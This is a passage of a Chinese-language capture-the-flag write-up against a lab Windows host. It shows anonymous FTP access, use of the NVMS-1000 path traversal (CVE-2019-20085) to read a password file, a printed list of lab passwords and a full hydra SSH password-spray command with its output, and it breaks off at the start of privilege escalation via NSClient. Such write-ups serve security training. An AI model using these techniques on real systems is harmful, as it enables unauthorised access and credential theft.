+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>5666/tcp  open  nrpe
+</span></span><span style="display:flex;"><span>6063/tcp  open  x11
+</span></span><span style="display:flex;"><span>6699/tcp  open  napster
+</span></span><span style="display:flex;"><span>8443/tcp  open  https-alt
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown
+</span></span><span style="display:flex;"><span>49668/tcp open  unknown
+</span></span><span style="display:flex;"><span>49669/tcp open  unknown
+</span></span><span style="display:flex;"><span>49670/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.23 seconds
+</span></span></code></pre></div><p>未扫描出漏洞。</p>
+<h2 id="21-ftp-渗透">21-FTP 渗透</h2>
+<p>使用 <code>anonymous</code> 尝试登录，登录成功后寻找 ftp 中的文件，下载至 Kali 中。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.129.227.77                                                                                                                
+</span></span><span style="display:flex;"><span>Connected to 10.129.227.77.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Microsoft FTP Service
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.129.227.77:kali<span style="color:#f92672">)</span>: Anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User logged in.
+</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
+</span></span><span style="display:flex;"><span>ftp&gt; ?
+</span></span><span style="display:flex;"><span>Commands may be abbreviated.  Commands are:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>!               <span style="color:#66d9ef">case</span>            dir             fget            idle            mdelete         modtime         ntrans          progress        rcvbuf          rmdir           sndbuf          type
+</span></span><span style="display:flex;"><span>$               cd              disconnect      form            image           mdir            more            open            prompt          recv            rstatus         status          umask
+</span></span><span style="display:flex;"><span>account         cdup            edit            ftp             lcd             mget            mput            page            proxy           reget           runique         struct          unset
+</span></span><span style="display:flex;"><span>append          chmod           epsv            gate            less            mkdir           mreget          passive         put             remopts         send            sunique         usage
+</span></span><span style="display:flex;"><span>ascii           close           epsv4           get             lpage           mls             msend           pdir            pwd             rename          sendport        system          user
+</span></span><span style="display:flex;"><span>bell            cr              epsv6           glob            lpwd            mlsd            newer           pls             quit            reset           set             tenex           verbose
+</span></span><span style="display:flex;"><span>binary          debug           exit            hash            ls              mlst            nlist           pmlsd           quote           restart         site            throttle        xferbuf
+</span></span><span style="display:flex;"><span>bye             delete          features        help            macdef          mode            nmap            preserve        rate            rhelp           size            trace           ?
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49678|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>02-28-22  07:35PM       &lt;DIR&gt;          Users
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; cd Users
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49680|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>02-28-22  07:36PM       &lt;DIR&gt;          Nadine
+</span></span><span style="display:flex;"><span>02-28-22  07:37PM       &lt;DIR&gt;          Nathan
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; cd Nadine
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49682|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>02-28-22  07:36PM                  <span style="color:#ae81ff">168</span> Confidential.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; mget Confidential.txt                                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>mget Confidential.txt <span style="color:#f92672">[</span>anpqy?<span style="color:#f92672">]</span>? y
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49685|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |*********************************************************************************************************************************************************************|   <span style="color:#ae81ff">168</span>        1.42 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>WARNING! <span style="color:#ae81ff">6</span> bare linefeeds received in ASCII mode.
+</span></span><span style="display:flex;"><span>File may not have transferred correctly.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">168</span> bytes received in 00:00 <span style="color:#f92672">(</span>1.28 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; cd ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49686|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>02-28-22  07:36PM       &lt;DIR&gt;          Nadine
+</span></span><span style="display:flex;"><span>02-28-22  07:37PM       &lt;DIR&gt;          Nathan
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; cd Nathan
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> CWD command successful.
+</span></span><span style="display:flex;"><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49688|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>02-28-22  07:36PM                  <span style="color:#ae81ff">182</span> Notes to <span style="color:#66d9ef">do</span>.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; mget Notes<span style="color:#ae81ff">\ </span>to<span style="color:#ae81ff">\ </span><span style="color:#66d9ef">do</span>.txt
+</span></span><span style="display:flex;"><span>mget Notes to <span style="color:#66d9ef">do</span>.txt <span style="color:#f92672">[</span>anpqy?<span style="color:#f92672">]</span>? y
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49691|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening ASCII mode data connection.
+</span></span><span style="display:flex;"><span>100% |*********************************************************************************************************************************************************************|   <span style="color:#ae81ff">182</span>        1.56 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span>WARNING! <span style="color:#ae81ff">4</span> bare linefeeds received in ASCII mode.
+</span></span><span style="display:flex;"><span>File may not have transferred correctly.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">182</span> bytes received in 00:00 <span style="color:#f92672">(</span>1.54 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; exit
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span> Goodbye.
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah       
+</span></span><span style="display:flex;"><span>total 56K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2759041</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> kali kali 4.0K Mar <span style="color:#ae81ff">11</span> 22:32  .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2490457</span> drwxrwxr-x <span style="color:#ae81ff">27</span> kali kali 4.0K Mar  <span style="color:#ae81ff">2</span> 03:38  ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2774920</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> kali kali  <span style="color:#ae81ff">168</span> Feb <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2022</span>  Confidential.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2767466</span> -rw-------  <span style="color:#ae81ff">1</span> kali kali 1.2K Dec <span style="color:#ae81ff">31</span> 01:25  .gdb_history
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2774923</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> kali kali  <span style="color:#ae81ff">182</span> Feb <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2022</span> <span style="color:#e6db74">&#39;Notes to do.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2772183</span> -rw-r--r--  <span style="color:#ae81ff">1</span> kali kali  12K Jan <span style="color:#ae81ff">21</span> 01:36  .payload.xml.swp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2774898</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">705</span> Mar <span style="color:#ae81ff">11</span> 22:17  ports.gnmap
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2774778</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">742</span> Mar <span style="color:#ae81ff">11</span> 22:17  ports.nmap
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2774918</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root 3.6K Mar <span style="color:#ae81ff">11</span> 22:17  ports.xml
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2768878</span> -rw-------  <span style="color:#ae81ff">1</span> kali kali  12K Dec <span style="color:#ae81ff">31</span> 01:35  .ret2libc.py.swp
+</span></span></code></pre></div><p>查看下载下来的文本，提示将 <code>Password.txt</code> 放置至桌面。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat Confidential.txt 
+</span></span><span style="display:flex;"><span>Nathan,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Regards
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nadine                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat Notes<span style="color:#ae81ff">\ </span>to<span style="color:#ae81ff">\ </span><span style="color:#66d9ef">do</span>.txt 
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Change the password <span style="color:#66d9ef">for</span> NVMS - Complete
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Lock down the NSClient Access - Complete
+</span></span><span style="display:flex;"><span>3<span style="color:#f92672">)</span> Upload the passwords
+</span></span><span style="display:flex;"><span>4<span style="color:#f92672">)</span> Remove public access to NVMS
+</span></span><span style="display:flex;"><span>5<span style="color:#f92672">)</span> Place the secret files in SharePoint 
+</span></span></code></pre></div><h2 id="80-web-渗透">80-Web 渗透</h2>
+<p>访问 Web 端口，发现运行的是 NVMS-1000 系统，这个系统存在 CVE-2019-20085 路径遍历漏洞，可以读取任意文件。</p>
+<p>运行 Burp Suite，抓包将传输类型改为 GET，尝试读取前面发现的 <code>Password.txt</code> 文件，发现暴露出了很多密码。</p>
+<p><img src="Pasted%20image%2020260312110053.png" alt=""></p>
+<p>对目前已知的两个用户进行 ssh 密码喷射</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim pass.lst             
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim user.lst
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat pass.lst                           
+</span></span><span style="display:flex;"><span>1nsp3ctTh3Way2Mars!
+</span></span><span style="display:flex;"><span>Th3r34r3To0M4nyTrait0r5!
+</span></span><span style="display:flex;"><span>B3WithM30r4ga1n5tMe
+</span></span><span style="display:flex;"><span>L1k3B1gBut7s@W0rk
+</span></span><span style="display:flex;"><span>0nly7h3y0unGWi11F0l10w
+</span></span><span style="display:flex;"><span>IfH3s4b0Utg0t0H1sH0me
+</span></span><span style="display:flex;"><span>Gr4etN3w5w17hMySk1Pa5$
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat user.lst 
+</span></span><span style="display:flex;"><span>Nadine
+</span></span><span style="display:flex;"><span>Nathan
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo hydra -L user.lst -P pass.lst ssh://10.129.227.77:22 -t <span style="color:#ae81ff">30</span> -V
+</span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2026-03-11 23:05:31
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">14</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">14</span> tasks, <span style="color:#ae81ff">14</span> login tries <span style="color:#f92672">(</span>l:2/p:7<span style="color:#f92672">)</span>, ~1 try per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.129.227.77:22/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nadine&#34;</span> - pass <span style="color:#e6db74">&#34;1nsp3ctTh3Way2Mars!&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nadine&#34;</span> - pass <span style="color:#e6db74">&#34;Th3r34r3To0M4nyTrait0r5!&#34;</span> - <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nadine&#34;</span> - pass <span style="color:#e6db74">&#34;B3WithM30r4ga1n5tMe&#34;</span> - <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nadine&#34;</span> - pass <span style="color:#e6db74">&#34;L1k3B1gBut7s@W0rk&#34;</span> - <span style="color:#ae81ff">4</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nadine&#34;</span> - pass <span style="color:#e6db74">&#34;0nly7h3y0unGWi11F0l10w&#34;</span> - <span style="color:#ae81ff">5</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 4<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nadine&#34;</span> - pass <span style="color:#e6db74">&#34;IfH3s4b0Utg0t0H1sH0me&#34;</span> - <span style="color:#ae81ff">6</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 5<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nadine&#34;</span> - pass <span style="color:#e6db74">&#34;Gr4etN3w5w17hMySk1Pa5</span>$<span style="color:#e6db74">&#34;</span> - <span style="color:#ae81ff">7</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 6<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;1nsp3ctTh3Way2Mars!&#34;</span> - <span style="color:#ae81ff">8</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 7<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;Th3r34r3To0M4nyTrait0r5!&#34;</span> - <span style="color:#ae81ff">9</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 8<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;B3WithM30r4ga1n5tMe&#34;</span> - <span style="color:#ae81ff">10</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 9<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;L1k3B1gBut7s@W0rk&#34;</span> - <span style="color:#ae81ff">11</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 10<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;0nly7h3y0unGWi11F0l10w&#34;</span> - <span style="color:#ae81ff">12</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 11<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;IfH3s4b0Utg0t0H1sH0me&#34;</span> - <span style="color:#ae81ff">13</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 12<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;Gr4etN3w5w17hMySk1Pa5</span>$<span style="color:#e6db74">&#34;</span> - <span style="color:#ae81ff">14</span> of <span style="color:#ae81ff">14</span> <span style="color:#f92672">[</span>child 13<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.129.227.77   login: Nadine   password: L1k3B1gBut7s@W0rk
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>REDO-ATTEMPT<span style="color:#f92672">]</span> target 10.129.227.77 - login <span style="color:#e6db74">&#34;Nathan&#34;</span> - pass <span style="color:#e6db74">&#34;0nly7h3y0unGWi11F0l10w&#34;</span> - <span style="color:#ae81ff">16</span> of <span style="color:#ae81ff">16</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>2/2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2026-03-11 23:05:34
+</span></span></code></pre></div><p>得到 <code>Nadine</code> 用户的密码为 <code>L1k3B1gBut7s@W0rk</code>，连接 ssh。</p>
+<h2 id="windows-提权">Windows 提权</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.864<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nadine@SERVMON C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\N</span>adine&gt;dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 20C1-47A1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\N</span>adine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          3D Objects
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Contacts
+</span></span><span style="display:flex;"><span>02/28/2022  08:05 PM    &lt;DIR&gt;          Desktop
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Documents
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Downloads
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Favorites
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Links
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Music
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Pictures
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Saved Games
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Searches
+</span></span><span style="display:flex;"><span>02/28/2022  08:04 PM    &lt;DIR&gt;          Videos
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
+</span></span><span style="display:flex;"><span>              <span style="color:#ae81ff">14</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   6,107,152,384 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nadine@SERVMON C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\N</span>adine&gt;whoami
+</span></span><span style="display:flex;"><span>servmon<span style="color:#ae81ff">\n</span>adine
+</span></span></code></pre></div><p>收集信息发现在 <code>Program Files</code> 目录下有一个第三方应用 <code>NSClient</code> 可能可以被利用提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nadine@SERVMON C:<span style="color:#ae81ff">\P</span>rogram Files&gt;dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 20C1-47A1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\P</span>rogram Files
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>02/28/2022  07:55 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>02/28/2022  07:55 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>03/01/2022  02:20 AM    &lt;DIR&gt;          Common Files
